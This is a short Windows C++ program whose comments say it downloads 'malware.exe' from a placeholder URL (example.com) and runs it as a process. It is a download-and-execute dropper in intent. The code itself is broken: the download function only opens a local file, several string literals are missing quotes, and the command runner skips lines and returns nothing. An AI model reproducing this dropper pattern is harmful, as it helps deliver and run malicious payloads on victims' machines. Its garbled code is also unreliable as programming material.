#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <Windows.h>

using namespace std;

// Function to download a file from a URL and save it in the current directory
void DownloadFile(const string& url, const string& output_path) {
    fstream download_file{output_path, ios::binary | ios::in};
    if (!download_file.is_open()) {
        cout << File not found: " << url << endl;
        return;
    }

    string line;
    while (getline(download_file, line)) {
        // Print the file's contents to the console
        cout << line << endl;
    }

    download_file.close();
}

// Function to execute a command and return its output
string ExecuteCommand(const string& cmd) {
    string result;
    vector<char> buffer(2048);

    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        cout << Failed to execute command: " << cmd << endl;
        return result;
    }

    while (fgets(&buffer[0], 2048, pipe)) {
        // Print the command's output to the console
        cout << buffer << endl;

        // Read next line
        fgets(&buffer[0], 2048, pipe);
    }

    _pclose(pipe);

    return result;
}

int main() {
    // Set a URL to download the malware from
    string url = https://example.com/malware.exe;
    
    // Save the malware file in the current directory
    DownloadFile(url, ./malware.exe);

    // Execute the malware as a process and get its output
    string output = ExecuteCommand(./malware.exe);

    // Print the output to the console
    cout << Output: << endl;
    cout << output << endl;

    return 0;
}
